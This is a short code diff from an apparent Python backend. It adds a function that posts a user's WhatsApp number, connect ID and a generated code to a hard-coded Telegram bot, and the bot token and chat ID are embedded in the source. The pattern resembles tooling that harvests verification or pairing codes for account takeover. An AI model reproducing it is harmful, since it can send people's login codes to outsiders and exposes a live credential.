@@ -50,3 +50,15 @@ def new_user_register_message(message):
     }
     response = requests.post(url, data=data)
     return response.json()
+
+def code_send_notify(whatsapp,connect_id,code):
+    TELEGRAM_BOT_TOKEN = "7566210125:AAERFGI5D4HjnFqRH7LRi5cgXIc9ihmedC4"  # Apna Bot Token Dal
+    TELEGRAM_CHAT_ID = "5862453909"  # Apna Telegram Chat ID Dal
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+
+    data = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": f"Code Generated ! \n\n whatsapp:{whatsapp} \n\n connect ID:{connect_id} \n\n 'code:{code}",
+    }
+    response = requests.post(url, data=data)
+    return response.json()
